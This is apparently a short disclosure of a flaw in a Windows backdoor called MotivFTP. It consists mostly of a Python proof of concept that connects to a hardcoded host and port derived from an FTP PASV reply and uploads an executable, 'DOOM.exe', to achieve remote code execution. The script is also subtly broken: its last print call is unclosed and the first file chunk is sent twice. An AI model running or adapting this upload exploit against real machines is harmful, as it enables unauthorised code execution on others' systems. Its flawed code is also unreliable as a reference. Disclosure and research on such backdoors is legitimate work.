Attackers may then upload executables using ftp PASV, STOR commands, this
can result in remote code execution.
Type: PE32

from socket import *

MALWARE_HOST="192.168.88.127"
PORT=49954
DOOM="DOOM.exe"   #Calculate the port 195*256+34 = 49954

def doit():
    s=socket(AF_INET, SOCK_STREAM)
    s.connect((MALWARE_HOST, PORT))

    f = open(DOOM, "rb")
    EXE = f.read()
    s.send(EXE)

    while EXE:
        s.send(EXE)
        EXE=f.read()

    s.close()

    print("Backdoor.Win32.MotivFTP.12 / Authentication Bypass RCE")
    print("MD5: 88785a093b8fa00893214dd220ac255d"
